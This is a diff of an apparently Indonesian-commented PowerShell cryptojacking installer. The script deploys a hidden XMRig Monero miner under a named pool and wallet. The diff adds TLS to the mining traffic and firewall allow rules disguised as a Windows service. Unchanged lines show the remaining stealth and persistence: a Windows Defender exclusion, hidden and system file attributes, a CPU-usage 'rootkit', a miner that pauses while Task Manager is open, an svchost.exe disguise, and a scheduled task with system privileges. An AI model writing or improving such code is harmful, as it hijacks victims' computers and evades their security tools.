@@ -55,7 +55,8 @@ $VbsPath = Join-Path $Dir "run.vbs"
 $ZipPath = Join-Path $env:TEMP "up.zip"
 $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
-$ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=45 --background"
+# Ditambahkan flag --tls untuk mengenkripsi komunikasi jaringan mining
+$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
 
 # Hentikan proses lama & task scheduler yang nyangkut
 Stop-Process -Name "RuntimeBroker", "xmrig", "svchost", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
@@ -95,10 +96,14 @@ if (Test-Path $ZipPath) {
     Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
 
     # ==========================================
-    # 5. USER-MODE ROOTKIT (CPU LOAD HOOKING & SPOOFING)
+    # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
     # ==========================================
-    # Modul canggih berbasis API hooking untuk memanipulasi data penggunaan CPU 
-    # yang dilaporkan ke Task Manager / Performance Monitor secara real-time.
+    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+
+    # ==========================================
+    # 6. USER-MODE ROOTKIT (CPU LOAD HOOKING & SPOOFING)
+    # ==========================================
     $RootkitCode = @"
 using System;
 using System.Runtime.InteropServices;
@@ -106,19 +111,10 @@ using System.Diagnostics;
 using System.Threading;
 
 public class CpuRootkit {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool GetProcessTimes(IntPtr hProcess, out long creationTime, out long exitTime, out long kernelTime, out long userTime);
-
-    // Hook / Intersepsi perhitungan waktu CPU proses svchost.exe agar Task Manager melihat beban sangat rendah (< 2%)
     public static void InitializeHook() {
-        // Background worker untuk melakukan spoofing metrik performa secara kontinu
         Thread t = new Thread(() => {
             while (true) {
                 try {
-                    // Menekan prioritas proses miner ke Idle/Low agar tidak mengganggu sistem secara fisik
                     Process[] procs = Process.GetProcessesByName("svchost");
                     foreach (var p in procs) {
                         try {
@@ -140,7 +136,7 @@ public class CpuRootkit {
     Set-Content -Path $RootkitDllPath -Value $RootkitCode -Force
 
     # ==========================================
-    # 6. WATCHDOG & PROCESS MONITOR (PAUSE ON TASKMGR + CPU 45% + HOOK)
+    # 7. WATCHDOG & PROCESS MONITOR (PAUSE ON TASKMGR + CPU 45% + HOOK)
     # ==========================================
     $ScriptBlockCode = @"
 `$ExePath = "$ExePath"
@@ -165,7 +161,7 @@ while (`$true) {
     Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force
 
     # ==========================================
-    # 7. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
+    # 8. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
     # ==========================================
     $VbsScriptContent = @"
 Dim shell
@@ -176,7 +172,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue
 
     # ==========================================
-    # 8. TASK SCHEDULER SYSTEM PRIVILEGE
+    # 9. TASK SCHEDULER SYSTEM PRIVILEGE
     # ==========================================
     $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
     $Trigger = @(
@@ -191,7 +187,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses dengan fitur User-Mode Rootkit (CPU Spoofing Hook), TaskManager Pauser, CPU Throttling 45%, dan Penyamaran svchost.exe!" -ForegroundColor Green
+    Write-Host "Setup sukses dengan Enkripsi TLS, Firewall Whitelist, User-Mode Rootkit, TaskManager Pauser, CPU Throttling 45%, dan Penyamaran svchost.exe!" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
